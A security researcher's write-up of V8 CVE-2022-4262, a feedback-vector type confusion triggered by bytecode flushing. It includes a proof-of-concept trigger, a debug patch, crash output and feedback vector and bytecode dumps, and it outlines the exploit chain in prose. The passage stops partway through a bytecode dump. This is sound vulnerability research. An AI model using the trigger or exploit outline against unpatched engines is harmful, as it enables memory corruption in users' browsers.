# CVE-2022-4262

Author: Jack Ren ([@bjrjk](https://github.com/bjrjk))

This V8 CVE is the one of the most difficult and non-trivial type confusion vulnerability I've ever met since I started to study JavaScript engine vulnerabilities. It has spent me more than two full weeks and numerous spare time to analyze this bug and try to find an exploit. However, I was only able to accomplish a [root cause analysis (in Chinese)<sup>1</sup>](#RefList-1) because of having no time to investigate this vulnerability anymore. That's really a pity I didn't have time to figure out the exploit myself.

However, the pity is finally settled down after [@mistymntncop](https://github.com/mistymntncop) using his brilliant intelligence to develop an [exploit<sup>2</sup>](#RefList-2). This exploit is so tricky and artful that I cannot suppress my thrilled feeling! @mistymntncop is really an V8 codebase auditing genius to develop this fragile exploit!

In order to preserve his precious thought and commemorate my time on this unruly CVE, I decide to write a full analysis on the vulnerability. This write up will divide the whole exploit process into different stages, each described in a section in this article, to make you readers easier to understand.

The article will be mainly made up of the following 5 technical sections:
- [Overview](#overview): Because of the complicated root cause and the long exploit chain, an overview will be presented to help you have a rough understanding of this CVE and its possible attack impacts.
- [Proof of Concept](#proof-of-concept): This section delivers information about proof of concept, its runtime output and its sketchy runtime logic.
- [Root Cause Analysis](#root-cause-analysis): We'll figure out the root cause of this uncommon type confusion in function's feedback vector. This vulnerability is due to strictness mismatch in execution context, i.e. scope.
- [Simplified Exploit](#simplified-exploit): A simplified exploit will be provided and introduced to readers to make a better understanding of the formal exploit's key point.
- [Exploit Primitive in V8 Sandbox](#exploit-primitive-in-v8-sandbox): This section contains the JavaScript source utilizing the vulnerability to achieve Address-Of, Fake-Object, Read & Write Primitive in V8 Sandbox. Meanwhile it will also describe why the source's capable to do so.

Each section, except Overview, will contain multiple subsections. They are typically starting with background knowledges, then source code (PoC, Exploit) or patch, which is followed by a technology analysis upon it. Finally, a conclusion will summarize the whole section.

Now, let's start with Overview for CVE-2022-4262!

# Overview

In order to reduce V8's memory usage, a mechanism called [*Bytecode<sup>(1)</sup> flushing*<sup>3</sup>](#RefList-3) is implemented on V8 engine. The core idea of *Bytecode flushing* is to jettison unused function bytecodes when every major (mark-compact) GC<sup>(2)</sup> occured, as bytecode will consume lots of memory. However, the function's feedback vector<sup>(3)</sup> won't be recycled when the bytecode is being recycled.

There exists two execution mode for JavaScript, respectively named [*strict mode*<sup>4</sup>](#RefList-4) and *non-strict mode*, i.e. *sloppy mode*. From the very beginning of the proposing of JavaScript language to the publish of ECMAScript<sup>(4)</sup> 5 standard, all JavaScript code runs in *sloppy mode*. *Strict mode* is introduced by this new standard to strictify the semantic of JavaScript language. Due to the emerging of *strict mode*, a set of flags must be set up for [scopes<sup>5</sup>](#RefList-5) to indicate code in this scope runs in which mode.

[`eval()`<sup>6</sup>](#RefList-6) is one of the most important JavaScript builtin function. It provides the capability to dynamically execute JavaScript by passing a string argument of JavaScript code. The semantic of `eval` function is different between *strict mode* and *sloppy mode*. In *sloppy mode*, `eval` may introduce new variables into the surrounding scope. But in *strict mode*, `eval` won't introduce any new variables into the surrounding scope anymore[<sup>7</sup>](#RefList-7). In order to record whether the feature is enabled, a boolean field named `sloppy_eval_can_extend_vars_` is defined in class `Scope`.

Because of the invoking of GC in vulnerability PoC, the bytecode of PoC will be jettisoned, then recompiled immediately after GC finished. Theoretically, the bytecode before and after GC should be consistent. However, due to the implementation error of JavaScript code parser, the value of `sloppy_eval_can_extend_vars_` field in a specific `Scope` instance is inconsistent across two bytecode generation process, which lead to the inconsistency of bytecode.

The feedback vector's content is reserved between GC. However, that's not what GC does to bytecode. Due to the inconsistency of bytecode across GC, different kind of bytecode may correspond to the same feedback slot position in feedback vector, in which contains old bytecode's profile information. In that case, the feedback slot handler of new bytecode will try to decode information of old type with a totally different format, this is the time when type confusion happened.

@mistymntncop mined out a brand-new method with his brilliant intelligence to enlarge the seemingly innocent feedback slot type confusion into an exploitable one. He found a feedback slot type named `SetNamedStrict`. The `SetNamedStrict` feedback slot take up two elements in feedback vector. The `SetNamedStrict` feedback slot's contents can be crafted by the attacker via the vulnerability to be in one of the [monomorphic<sup>9</sup>](#RefList-9) state, with the first element containing the [map<sup>10, (5)</sup>](#RefList-10) of [receiver](#RefList-11)'s original map, and the second element containing the map to which the receiver will transition. In other words, when the bytecode corresponding to the feedback slot is executing and the receiver's original map is equivalent to the first element, the receiver's map will be transitioned from the first element to the second element. What the most important thing is while the transition of map is happening, **the resizing of JavaScript object cell won't happen**. The reason why `SetNamedStrict` feedback can be utilized to transition object into a different map without object cell's change is because the feedback vector data is considered trusted. The V8 engine won't check the backpointer from the map because the point of [inline cache<sup>8, (3)</sup>](#RefList-8) is to speed things up and avoid consulting the transition tree. This indicate an Out of Bound (OOB) access (both R/W) can be executed to read or write other JavaScript object's metadata, e.g. array length. Until now, a limited primitive is formed.

The left things should be routines for V8 senior hackers. Two array with different type, i.e. `HOLEY_DOUBLE_ELEMENT` and `HOLEY_ELEMENT`, can be allocated adjacently. We use the above limited primitive to modify first array's length to allow its OOB access to the second array. Then the Address-Of and Fake-Object primitive can be achieved. Finally, we fake JavaScript Object in real JavaScript object's memory to get V8 Sandbox Read / Write primitives.

> (1) Bytecode is an intermediate representation of the original JavaScript source, which is generated and used by V8 to accelerate the execution speed of JavaScript source. <br/>
> (2) GC, also named garbage collection, is to free unused object in currrent execution context to relieve memory pressure and reserve space for other new objects. <br/>
> (3) Feedback vector is a V8 terminology indicating a data structure for the purpose of [Inline Cache (IC)<sup>8</sup>](#RefList-8). The feedback vector is the data-driven[<sup>14</sup>](#RefList-14) form of IC. JavaScript engines use ICs to memorize information on where to find properties on objects, to reduce the number of expensive lookups. Some types of bytecode may use feedback slots in feedback vector to accelerate their execution, while others not. <br/>
> (4) ECMAScript is the language specification of JavaScript. <br/>
> (5) Map is a V8 terminology indicating a data structure storing how a JavaScript object is represented in raw memory.

# Environmental Setup

## V8 Reproduce Commit

- Proof of Concept & Root Cause Analysis
    - Before Patch: `323ada0128db42088ee76dbeefa577fd07bfd7df`
    - After Patch: `27fa951ae4a3801126e84bc94d5c82dd2370d18b`
- Exploit: `18865d6af0404f2d2aeb1c99dd73503364ce0967`

To reproduce Simplified Exploit, you should append `v8_expose_memory_corruption_api = true` to  `args.gn` in build root directory[<sup>12</sup>](#RefList-12).

To know how to build V8, please refer to [Building V8 from source<sup>13</sup>](#RefList-13).

## d8 Command Line Options

- Proof of Concept & Root Cause Analysis: `out/x64.debug/d8 --allow-natives-syntax --print-bytecode --print-scopes --trace-flush-bytecode --trace-gc --trace-lazy --no-concurrent_recompilation --no-concurrent-sweeping PoC.js`
- Exploit: `out/x64.release/d8 --allow-natives-syntax exploit.js`

# Proof of Concept

## Sources

### Debug Patch Diff

In order to have an intuitive presentation of feedback vector when debugging, please save the following patch with filename `debug.patch`, then apply it with command `git apply debug.patch`.

```diff
diff --git a/src/builtins/ic-callable.tq b/src/builtins/ic-callable.tq
index a9cc43c716b..9df2305ad55 100644
--- a/src/builtins/ic-callable.tq
+++ b/src/builtins/ic-callable.tq
@@ -100,6 +100,7 @@ macro CollectCallFeedback(
   const feedbackVector =
       Cast<FeedbackVector>(maybeFeedbackVector) otherwise return;
   IncrementCallCount(feedbackVector, slotId);
+  Print("vector", feedbackVector);
 
   try {
     const feedback: MaybeObject =
diff --git a/src/objects/feedback-vector.cc b/src/objects/feedback-vector.cc
index 65321d50969..ebd282c539e 100644
--- a/src/objects/feedback-vector.cc
+++ b/src/objects/feedback-vector.cc
@@ -747,7 +747,7 @@ InlineCacheState FeedbackNexus::ic_state() const {
           if (heap_object.IsFeedbackCell()) {
             return InlineCacheState::POLYMORPHIC;
           }
-          CHECK(heap_object.IsJSFunction() || heap_object.IsJSBoundFunction());
+          // CHECK(heap_object.IsJSFunction() || heap_object.IsJSBoundFunction());
         }
         return InlineCacheState::MONOMORPHIC;
       } else if (feedback->GetHeapObjectIfStrong(&heap_object) &&
```

### PoC Source

```javascript
GC = function () {
    try {
        for (let i = 0; i < 6; i++) {
            let ab = new ArrayBuffer(31 * 1024 * 1024 * 1024);
        }
    } catch (e) {
        print(e);
    }
};
for (let j = 0; j < 13; j++) {
    function dummy() { }
    {
        ((a = class b3 {
            [({ c: eval(), d: dummy(eval), e: dummy(eval) } ? 0 : (aa = 0xdeadbbed, bb = 0xdeadbeef))]
        }) => { })();
    }
    if (j == 11) {
        GC();
    }
}
```

## Background Knowledges

### ComputedPropertyName Syntax

[Computed Property Name<sup>15</sup>](#RefList-15) is a new syntax introduced in ES6 to allow you dynamically calculate expression as a property name in object initializer. The following are examples.

```javascript
let prop = "p";
class C {
    [prop] = 1;
    [prop + "1"] = 2;
}
console.log(new C());

// C {p: 1, p1: 2}
```

```javascript
// Among the next line, "0" is a property with initial value `undefined`
> class b3 {"0" = undefined} // or class b3 {0 = undefined}
undefined
> new b3()
b3 {0: undefined}

// `undefined` can be omitted
> class b3 {0}
undefined
> new b3()
b3 {0: undefined}

// "[0]" is a `ComputedPropertyName` syntax unit, which is equivalent to "0"
> class b3 {[0]}
undefined
> new b3()
b3 {0: undefined}
```

### Default Parameter for Arrow Function

```javascript
> ((a = 1) => { return a; })();
1
```

### Conditional (Ternary) Operator

When evaluating [Conditional Operator<sup>16</sup>](#RefList-16), if the `ShortCircuitExpression` is an object, the condition will always considered to be true. 

```javascript
> ({ c: undefined, d: undefined, e: undefined }) ? 1 : (aa = 1, bb = 2)
1
```

## Execution Result and Brief Analysis

### Crash Point

Through the following message, we could find that type confusion occured between `PropertyCell` and `FeedbackCell`.

```
# Fatal error in ../../src/objects/object-type.cc, line 81
# Type cast failed in CAST(GetHeapObjectAssumeWeak(maybe_weak_ref, try_handler)) at ../../src/ic/accessor-assembler.cc:3371
  Expected PropertyCell but found 0x3f890025a9b1: [FeedbackCell] in OldSpace
 - map: 0x3f8900002b11 <Map[12](FEEDBACK_CELL_TYPE)>
 - many closures
 - value: 0x3f890025adc9 <FeedbackVector[0]>
 - interrupt_budget: 67554

#
#
#
#FailureMessage Object: 0x7fffe1cb2a70
==== C stack trace ===============================

    /home/jack/Documents/JavaScriptEngine/v9/v8/out/x64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x1e) [0x7efde69bef1e]
    /home/jack/Documents/JavaScriptEngine/v9/v8/out/x64.debug/libv8_libplatform.so(+0x4ad9d) [0x7efde6914d9d]
    /home/jack/Documents/JavaScriptEngine/v9/v8/out/x64.debug/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x16f) [0x7efde698db9f]
    /home/jack/Documents/JavaScriptEngine/v9/v8/out/x64.debug/libv8.so(v8::internal::CheckObjectType(unsigned long, unsigned long, unsigned long)+0x836b) [0x7efde4e37b4b]
    [0x7efd7fdc2f27]
```

Via code auditing to function near `src/ic/accessor-assembler.cc:3371`, we'll found the type confused object is located in feedback vector. As the object failed to be casted named `maybe_weak_ref` is got from `LoadFeedbackVectorSlot(vector, slot)` at line 3363.

```cpp
void AccessorAssembler::LoadGlobalIC_TryPropertyCellCase(
    TNode<FeedbackVector> vector, TNode<TaggedIndex> slot,
    const LazyNode<Context>& lazy_context, ExitPoint* exit_point,
    Label* try_handler, Label* miss) {
  Comment("LoadGlobalIC_TryPropertyCellCase");

  Label if_lexical_var(this), if_property_cell(this);
  TNode<MaybeObject> maybe_weak_ref = LoadFeedbackVectorSlot(vector, slot); // <- Line 3363
  Branch(TaggedIsSmi(maybe_weak_ref), &if_lexical_var, &if_property_cell);

  BIND(&if_property_cell);
  {
    // Load value or try handler case if the weak reference is cleared.
    CSA_DCHECK(this, IsWeakOrCleared(maybe_weak_ref));
    TNode<PropertyCell> property_cell =
        CAST(GetHeapObjectAssumeWeak(maybe_weak_ref, try_handler)); // <- Line 3371 [!]
    TNode<Object> value =
        LoadObjectField(property_cell, PropertyCell::kValueOffset);
    GotoIf(TaggedEqual(value, TheHoleConstant()), miss);
    exit_point->Return(value);
  }

  // ...
```

### Feedback Vector

As the type confusion occurs in feedback vector, we need to carefully inspect contents in feedback vector. Mentioned that the vulnerability is triggered after finished `GC()`, we inspect the content of feedback vector both before and after garbage collection.

#### Content before GC

```
vector: DebugPrint: 0x3fe00025b191: [FeedbackVector] in OldSpace
 - map: 0x3fe00000273d <Map(FEEDBACK_VECTOR_TYPE)>
 - length: 21
 - shared function info: 0x3fe00025a59d <SharedFunctionInfo>
 - no optimized code
 - tiering state: TieringState::kNone
 - maybe has maglev code: 0
 - maybe has turbofan code: 0
 - invocation count: 4
 - profiler ticks: 0
 - closure feedback cell array: 0x3fe00025aa19: [ClosureFeedbackCellArray] in OldSpace
 - map: 0x3fe000002981 <Map(CLOSURE_FEEDBACK_CELL_ARRAY_TYPE)>
 - length: 2
           0: 0x3fe00025aa29 <FeedbackCell[many closures]>
           1: 0x3fe00025aa35 <FeedbackCell[many closures]>

 - slot #0 Literal  {
     [0]: 0x3fe00025b2bd <AllocationSite>
  }
 - slot #1 LoadGlobalNotInsideTypeof MONOMORPHIC
   [weak] 0x3fe00025442d <PropertyCell name=0x3fe000006005 <String[4]: #eval> value=0x3fe00024af25 <JSFunction eval (sfi = 0x3fe00021de05)>> {
     [1]: [weak] 0x3fe00025442d <PropertyCell name=0x3fe000006005 <String[4]: #eval> value=0x3fe00024af25 <JSFunction eval (sfi = 0x3fe00021de05)>>
     [2]: 0x3fe0000073e5 <Symbol: (uninitialized_symbol)>
  }
 - slot #3 Call MONOMORPHIC {
     [3]: [weak] 0x3fe00024af25 <JSFunction eval (sfi = 0x3fe00021de05)>
     [4]: 12
  }
 - slot #5 DefineNamedOwn MONOMORPHIC {
     [5]: [weak] 0x3fe00025aab9 <Map[24](HOLEY_ELEMENTS)>
     [6]: 3604480
  }
 - slot #7 Call POLYMORPHIC {
     [7]: [weak] 0x3fe00025a9b1 <FeedbackCell[many closures]>
     [8]: 12
  }
 - slot #9 DefineNamedOwn MONOMORPHIC {
     [9]: [weak] 0x3fe00025aab9 <Map[24](HOLEY_ELEMENTS)>
     [10]: 4653120
  }
 - slot #11 Call POLYMORPHIC {
     [11]: [weak] 0x3fe00025a9b1 <FeedbackCell[many closures]>
     [12]: 12
  }
 - slot #13 DefineNamedOwn MONOMORPHIC {
     [13]: [weak] 0x3fe00025aab9 <Map[24](HOLEY_ELEMENTS)>
     [14]: 5701760
  }
 - slot #15 StoreGlobalStrict UNINITIALIZED {
     [15]: [cleared]
     [16]: 0x3fe0000073e5 <Symbol: (uninitialized_symbol)>
  }
 - slot #17 StoreGlobalStrict UNINITIALIZED {
     [17]: [cleared]
     [18]: 0x3fe0000073e5 <Symbol: (uninitialized_symbol)>
  }
 - slot #19 SetNamedStrict POLYMORPHIC
   [weak] 0x3fe00025b22d <Map[32](HOLEY_ELEMENTS)>: StoreHandler(Smi)(kind = kSlow, keyed access store mode = STANDARD_STORE)

   [weak] 0x3fe00025b301 <Map[32](HOLEY_ELEMENTS)>: StoreHandler(Smi)(kind = kSlow, keyed access store mode = STANDARD_STORE)
 {
     [19]: 0x3fe00010d249 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
     [20]: 0x3fe0000073e5 <Symbol: (uninitialized_symbol)>
  }
0x3fe00000273d: [Map] in ReadOnlySpace
 - type: FEEDBACK_VECTOR_TYPE
 - instance size: variable
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x3fe0000023e1 <undefined>
 - prototype_validity cell: 0
 - instance descriptors (own) #0: 0x3fe0000021ed <Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)>
 - prototype: 0x3fe000002261 <null>
 - constructor: 0x3fe000002261 <null>
 - dependent code: 0x3fe0000021e1 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0
```

#### Content after GC

```
vector: DebugPrint: 0x3fe00025b191: [FeedbackVector] in OldSpace
 - map: 0x3fe00000273d <Map(FEEDBACK_VECTOR_TYPE)>
 - length: 21
 - shared function info: 0x3fe00025a59d <SharedFunctionInfo>
 - no optimized code
 - tiering state: TieringState::kNone
 - maybe has maglev code: 0
 - maybe has turbofan code: 0
 - invocation count: 5
 - profiler ticks: 0
 - closure feedback cell array: 0x3fe00025aa19: [ClosureFeedbackCellArray] in OldSpace
 - map: 0x3fe000002981 <Map(CLOSURE_FEEDBACK_CELL_ARRAY_TYPE)>
 - length: 2
           0: 0x3fe00025aa29 <FeedbackCell[many closures]>
           1: 0x3fe00025aa35 <FeedbackCell[many closures]>

 - slot #0 Literal  {
     [0]: 0x3fe00025b2bd <AllocationSite>
  }
 - slot #1 LoadGlobalNotInsideTypeof MONOMORPHIC
   [weak] 0x3fe00025442d <PropertyCell name=0x3fe000006005 <String[4]: #eval> value=0x3fe00024af25 <JSFunction eval (sfi = 0x3fe00021de05)>> {
     [1]: [weak] 0x3fe00025442d <PropertyCell name=0x3fe000006005 <String[4]: #eval> value=0x3fe00024af25 <JSFunction eval (sfi = 0x3fe00021de05)>>
     [2]: 0x3fe0000073e5 <Symbol: (uninitialized_symbol)>
  }
 - slot #3 Call MONOMORPHIC {
     [3]: [weak] 0x3fe00024af25 <JSFunction eval (sfi = 0x3fe00021de05)>
     [4]: 16
  }
 - slot #5 DefineNamedOwn MONOMORPHIC {
     [5]: [weak] 0x3fe00025aab9 <Map[24](HOLEY_ELEMENTS)>
     [6]: 3604480
  }
 - slot #7 LoadGlobalNotInsideTypeof MONOMORPHIC
   LoadHandler(<unexpected>)(0x3fe00025a9b1 <FeedbackCell[many closures]>) {
     [7]: [weak] 0x3fe00025a9b1 <FeedbackCell[many closures]>
     [8]: 12
  }
 - slot #9 Call MONOMORPHIC {
     [9]: [weak] 0x3fe00025aab9 <Map[24](HOLEY_ELEMENTS)>
     [10]: 4653120
  }
 - slot #11 DefineNamedOwn MONOMORPHIC {
     [11]: [weak] 0x3fe00025a9b1 <FeedbackCell[many closures]>
     [12]: 12
  }
 - slot #13 LoadGlobalNotInsideTypeof MONOMORPHIC
   LoadHandler(<unexpected>)(0x3fe00025aab9 <Map[24](HOLEY_ELEMENTS)>) {
     [13]: [weak] 0x3fe00025aab9 <Map[24](HOLEY_ELEMENTS)>
     [14]: 5701760
  }
 - slot #15 Call MONOMORPHIC {
     [15]: [cleared]
     [16]: 0x3fe0000073e5 <Symbol: (uninitialized_symbol)>
  }
 - slot #17 DefineNamedOwn MONOMORPHIC {
     [17]: [cleared]
     [18]: 0x3fe0000073e5 <Symbol: (uninitialized_symbol)>
  }
 - slot #19 SetNamedStrict POLYMORPHIC
   [cleared]: StoreHandler(Smi)(kind = kSlow, keyed access store mode = STANDARD_STORE)

   [cleared]: StoreHandler(Smi)(kind = kSlow, keyed access store mode = STANDARD_STORE)

   [cleared]: StoreHandler(Smi)(kind = kSlow, keyed access store mode = STANDARD_STORE)
 {
     [19]: 0x3fe00025c0c5 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
     [20]: 0x3fe0000073e5 <Symbol: (uninitialized_symbol)>
  }
0x3fe00000273d: [Map] in ReadOnlySpace
 - type: FEEDBACK_VECTOR_TYPE
 - instance size: variable
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x3fe0000023e1 <undefined>
 - prototype_validity cell: 0
 - instance descriptors (own) #0: 0x3fe0000021ed <Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)>
 - prototype: 0x3fe000002261 <null>
 - constructor: 0x3fe000002261 <null>
 - dependent code: 0x3fe0000021e1 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0
```

#### Content Diff across GC

Via the content diff below, we could find that many feedback slot's type has changed. Especially, we should focus on slot #7.

Through observation, we could find that the type of slot #7 changed from `Call POLYMORPHIC` to `LoadGlobalNotInsideTypeof MONOMORPHIC` while contents corresponding to slot #7 (feedback vector element `[7]` & `[8]`) remain unchanged. What's more, a tag `<unexpected>` was added to slot #7's description because this isn't any desirable behaviour by the engine developer.

As slot #1's content remains consistent, we could confirm it's a feedback slot with normal behaviour. Mentioning that slot #1 and slot #7 has the same type `LoadGlobalNotInsideTypeof MONOMORPHIC`, their content type should be the same. The first feedback vector element of slot #1, `[1]`, is with content type `PropertyCell`. So the first feedback vector element of slot #7, `[7]`, should also be `PropertyCell` type, but its content type is `FeedbackCell` in reality. That indicate a type confusion occurs in slot #7, which is consistent with the crash message.

![](images/PoC_FeedbackVector_Diff.png)

The type confused object's confused type and real type is represented in figure below:

![](images/PoC_TypeConfusion.png)

### Bytecode

As the feedback vector, which is for the purpose of inline cache, is associated with bytecode closely, we'll also need to examine bytecode across GC.

#### Bytecode before GC

```
[generated bytecode for function:  (0x3fe00025a59d <SharedFunctionInfo>)]
Bytecode length: 141
Parameter count 2
Register count 10
Frame size 80
Bytecode age: 0
         0x3fe00025a87a @    0 : 83 00 01          CreateFunctionContext [0], [1]
         0x3fe00025a87d @    3 : 1a fa             PushContext r0
         0x3fe00025a87f @    5 : 10                LdaTheHole
         0x3fe00025a880 @    6 : 25 02             StaCurrentContextSlot [2]
         0x3fe00025a882 @    8 : 0b 03             Ldar a0
         0x3fe00025a884 @   10 : 9d 7d             JumpIfNotUndefined [125] (0x3fe00025a901 @ 135)
         0x3fe00025a886 @   12 : 81 01             CreateBlockContext [1]
         0x3fe00025a888 @   14 : 1a f9             PushContext r1
         0x3fe00025a88a @   16 : 10                LdaTheHole
         0x3fe00025a88b @   17 : 25 02             StaCurrentContextSlot [2]
         0x3fe00025a88d @   19 : 10                LdaTheHole
         0x3fe00025a88e @   20 : 25 03             StaCurrentContextSlot [3]
         0x3fe00025a890 @   22 : 10                LdaTheHole
         0x3fe00025a891 @   23 : bf                Star5
         0x3fe00025a892 @   24 : 80 03 00 02       CreateClosure [3], [0], #2
         0x3fe00025a896 @   28 : c2                Star2
         0x3fe00025a897 @   29 : 13 02             LdaConstant [2]
         0x3fe00025a899 @   31 : c1                Star3
         0x3fe00025a89a @   32 : 7c 04 00 29       CreateObjectLiteral [4], [0], #41
         0x3fe00025a89e @   36 : bd                Star7
         0x3fe00025a89f @   37 : 21 05 01          LdaGlobal [5], [1]
         0x3fe00025a8a2 @   40 : bc                Star8
         0x3fe00025a8a3 @   41 : 61 f2 03          CallUndefinedReceiver0 r8, [3]
         0x3fe00025a8a6 @   44 : 33 f3 06 05       DefineNamedOwnProperty r7, [6], [5]
         0x3fe00025a8aa @   48 : 14 fa 02 00       LdaContextSlot r0, [2], [0]
         0x3fe00025a8ae @   52 : bc                Star8
         0x3fe00025a8af @   53 : 21 05 01          LdaGlobal [5], [1]
         0x3fe00025a8b2 @   56 : bb                Star9
         0x3fe00025a8b3 @   57 : 62 f2 f1 07       CallUndefinedReceiver1 r8, r9, [7]
         0x3fe00025a8b7 @   61 : 33 f3 07 09       DefineNamedOwnProperty r7, [7], [9]
         0x3fe00025a8bb @   65 : 14 fa 02 00       LdaContextSlot r0, [2], [0]
         0x3fe00025a8bf @   69 : bc                Star8
         0x3fe00025a8c0 @   70 : 21 05 01          LdaGlobal [5], [1]
         0x3fe00025a8c3 @   73 : bb                Star9
         0x3fe00025a8c4 @   74 : 62 f2 f1 0b       CallUndefinedReceiver1 r8, r9, [11]
         0x3fe00025a8c8 @   78 : 33 f3 08 0d       DefineNamedOwnProperty r7, [8], [13]
         0x3fe00025a8cc @   82 : 19 f8 f6          Mov r2, r4
         0x3fe00025a8cf @   85 : 0b f3             Ldar r7
         0x3fe00025a8d1 @   87 : 97 05             JumpIfToBooleanFalse [5] (0x3fe00025a8d6 @ 92)
         0x3fe00025a8d3 @   89 : 0c                LdaZero
         0x3fe00025a8d4 @   90 : 8a 0f             Jump [15] (0x3fe00025a8e3 @ 105)
         0x3fe00025a8d6 @   92 : 13 09             LdaConstant [9]
         0x3fe00025a8d8 @   94 : 23 0a 0f          StaGlobal [10], [15]
         0x3fe00025a8db @   97 : 13 0b             LdaConstant [11]
         0x3fe00025a8dd @   99 : bd                Star7
         0x3fe00025a8de @  100 : 23 0c 11          StaGlobal [12], [17]
         0x3fe00025a8e1 @  103 : 0b f3             Ldar r7
         0x3fe00025a8e3 @  105 : 73 f4             ToName r6
         0x3fe00025a8e5 @  107 : 0b f4             Ldar r6
         0x3fe00025a8e7 @  109 : 25 02             StaCurrentContextSlot [2]
         0x3fe00025a8e9 @  111 : 65 29 00 f7 04    CallRuntime [DefineClass], r3-r6
         0x3fe00025a8ee @  116 : 0b f8             Ldar r2
         0x3fe00025a8f0 @  118 : 25 03             StaCurrentContextSlot [3]
         0x3fe00025a8f2 @  120 : 80 0d 01 02       CreateClosure [13], [1], #2
         0x3fe00025a8f6 @  124 : c1                Star3
         0x3fe00025a8f7 @  125 : 32 f8 0e 13       SetNamedProperty r2, [14], [19]
         0x3fe00025a8fb @  129 : 1b f9             PopContext r1
         0x3fe00025a8fd @  131 : 0b f8             Ldar r2
         0x3fe00025a8ff @  133 : 8a 04             Jump [4] (0x3fe00025a903 @ 137)
         0x3fe00025a901 @  135 : 0b 03             Ldar a0
         0x3fe00025a903 @  137 : 25 02             StaCurrentContextSlot [2]
         0x3fe00025a905 @  139 : 0e                LdaUndefined
         0x3fe00025a906 @  140 : a9                Return
Constant pool (size = 15)
0x3fe00025a7fd: [FixedArray] in OldSpace
 - map: 0x3fe000002231 <Map(FIXED_ARRAY_TYPE)>
 - length: 15
           0: 0x3fe00025a47d <ScopeInfo FUNCTION_SCOPE>
           1: 0x3fe00025a4ad <ScopeInfo CLASS_SCOPE>
           2: 0x3fe00025a7d9 <FixedArray[7]>
           3: 0x3fe00025a6d5 <SharedFunctionInfo b3>
           4: 0x3fe00025a735 <ObjectBoilerplateDescription[7]>
           5: 0x3fe000006005 <String[4]: #eval>
           6: 0x3fe0000040a5 <String[1]: #c>
           7: 0x3fe0000040b5 <String[1]: #d>
           8: 0x3fe0000040c5 <String[1]: #e>
           9: 0x3fe00025a841 <HeapNumber 3735927789.0>
          10: 0x3fe00025a37d <String[2]: #aa>
          11: 0x3fe00025a84d <HeapNumber 3735928559.0>
          12: 0x3fe00025a38d <String[2]: #bb>
          13: 0x3fe00025a70d <SharedFunctionInfo <instance_members_initializer>>
          14: 0x3fe0000071e5 <Symbol: (class_fields_symbol)>
Handler Table (size = 0)
Source Position Table (size = 0)
```

#### Bytecode after GC

```
[generated bytecode for function:  (0x3fe00025a59d <SharedFunctionInfo>)]
Bytecode length: 141
Parameter count 2
Register count 10
Frame size 80
Bytecode age: 0
         0x3fe00025c432 @    0 : 83 00 02          CreateFunctionContext [0], [2]
         0x3fe00025c435 @    3 : 1a fa             PushContext r0
         0x3fe00025c437 @    5 : 10                LdaTheHole
         0x3fe00025c438 @    6 : 25 03             StaCurrentContextSlot [3]
         0x3fe00025c43a @    8 : 0b 03             Ldar a0
         0x3fe00025c43c @   10 : 9d 7d             JumpIfNotUndefined [125] (0x3fe00025c4b9 @ 135)
         0x3fe00025c43e @   12 : 81 01             CreateBlockContext [1]
         0x3fe00025c440 @   14 : 1a f9             PushContext r1
         0x3fe00025c442 @   16 : 10                LdaTheHole
         0x3fe00025c443 @   17 : 25 02             StaCurrentContextSlot [2]
         0x3fe00025c445 @   19 : 10                LdaTheHole
         0x3fe00025c446 @   20 : 25 03             StaCurrentContextSlot [3]
         0x3fe00025c448 @   22 : 10                LdaTheHole
         0x3fe00025c449 @   23 : bf                Star5
         0x3fe00025c44a @   24 : 80 03 00 02       CreateClosure [3], [0], #2
         0x3fe00025c44e @   28 : c2                Star2
         0x3fe00025c44f @   29 : 13 02             LdaConstant [2]
         0x3fe00025c451 @   31 : c1                Star3
         0x3fe00025c452 @   32 : 7c 04 00 29       CreateObjectLiteral [4], [0], #41
         0x3fe00025c456 @   36 : bd                Star7
         0x3fe00025c457 @   37 : 28 05 01 02       LdaLookupGlobalSlot [5], [1], [2]
         0x3fe00025c45b @   41 : bc                Star8
         0x3fe00025c45c @   42 : 61 f2 03          CallUndefinedReceiver0 r8, [3]
         0x3fe00025c45f @   45 : 33 f3 06 05       DefineNamedOwnProperty r7, [6], [5]
         0x3fe00025c463 @   49 : 27 07 02 02       LdaLookupContextSlot [7], [2], [2]
         0x3fe00025c467 @   53 : bc                Star8
         0x3fe00025c468 @   54 : 28 05 07 02       LdaLookupGlobalSlot [5], [7], [2]
         0x3fe00025c46c @   58 : bb                Star9
         0x3fe00025c46d @   59 : 62 f2 f1 09       CallUndefinedReceiver1 r8, r9, [9]
         0x3fe00025c471 @   63 : 33 f3 08 0b       DefineNamedOwnProperty r7, [8], [11]
         0x3fe00025c475 @   67 : 27 07 02 02       LdaLookupContextSlot [7], [2], [2]
         0x3fe00025c479 @   71 : bc                Star8
         0x3fe00025c47a @   72 : 28 05 0d 02       LdaLookupGlobalSlot [5], [13], [2]
         0x3fe00025c47e @   76 : bb                Star9
         0x3fe00025c47f @   77 : 62 f2 f1 0f       CallUndefinedReceiver1 r8, r9, [15]
         0x3fe00025c483 @   81 : 33 f3 09 11       DefineNamedOwnProperty r7, [9], [17]
         0x3fe00025c487 @   85 : 19 f8 f6          Mov r2, r4
         0x3fe00025c48a @   88 : 0b f3             Ldar r7
         0x3fe00025c48c @   90 : 97 05             JumpIfToBooleanFalse [5] (0x3fe00025c491 @ 95)
         0x3fe00025c48e @   92 : 0c                LdaZero
         0x3fe00025c48f @   93 : 8a 0c             Jump [12] (0x3fe00025c49b @ 105)
         0x3fe00025c491 @   95 : 13 0a             LdaConstant [10]
         0x3fe00025c493 @   97 : 2c 0b 01          StaLookupSlot [11], #1
         0x3fe00025c496 @  100 : 13 0c             LdaConstant [12]
         0x3fe00025c498 @  102 : 2c 0d 01          StaLookupSlot [13], #1
         0x3fe00025c49b @  105 : 73 f4             ToName r6
         0x3fe00025c49d @  107 : 0b f4             Ldar r6
         0x3fe00025c49f @  109 : 25 02             StaCurrentContextSlot [2]
